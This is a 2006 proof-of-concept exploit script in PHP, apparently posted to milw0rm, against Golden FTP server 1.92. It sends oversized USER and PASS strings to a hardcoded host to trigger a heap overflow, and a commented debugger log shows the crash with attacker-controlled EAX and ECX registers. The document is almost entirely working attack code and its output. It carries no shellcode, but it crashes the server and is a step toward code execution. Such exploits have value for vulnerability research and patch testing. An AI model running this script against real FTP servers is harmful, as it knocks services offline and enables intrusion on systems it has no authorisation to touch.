@@ -1,0 +1,57 @@
+<?php
+#23.07 03/12/2006
+#Golden FTP server 1.92 (freeware edition) USER/PASS heap based overflow poc
+#by rgod  retrog at alice dot it
+#site: http://retrogod.altervista.org
+
+#download link: http://www.download.com/3000-2160_4-10375602.html?tag=sd.EXAF
+
+$host="192.168.1.3";
+$port="21";
+
+$junk="";
+for ($i=1; $i<=8095; $i++){
+    $junk.="a";
+}
+
+$eax="AAAA";
+$eax[0]=chr(ord($eax)-20); //to have the wanted eax
+$ecx="BBBB";
+
+$junk.=$ecx.$eax;
+
+$sock=@fsockopen($host,$port,$errno, $errstr, 10);
+if (!$sock){
+   die("\nnot connected!\n");
+}
+else {
+   fgets($sock,80);
+   fputs($sock,"USER ".$junk."\r\n");
+   fgets($sock,80);
+   fputs($sock,"PASS ".$junk."\r\n");
+   fclose($sock);
+}
+/*
+...
+17:07:28.144  pid=0870 tid=1128  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
+              ----------------------------------------------------------------
+              EAX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=00EBFD64: C4 9D A6 00 F4 BF A5 00-00 9F A6 00 BC FD EB 00
+              ESP=00EBFD1C: 00 00 00 00 58 FD EB 00-61 24 41 00 80 9F A6 00
+              EBP=00EBFD20: 58 FD EB 00 61 24 41 00-80 9F A6 00 F4 BF A5 00
+              ESI=004B9F04: 2D 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00
+              EDI=004B9F00: 42 42 42 42 2D 41 41 41-00 00 00 00 00 00 00 00
+              EIP=004A9B74: 8B 00 8B 12 E8 5F F6 FD-FF 0F 94 C0 83 E0 01 5B
+                            --> MOV EAX,[EAX]
+              ----------------------------------------------------------------
+
+17:07:28.254  pid=0870 tid=1128  Thread exited with code 0
+...
+*/
+?>
+
+# milw0rm.com [2006-12-11]
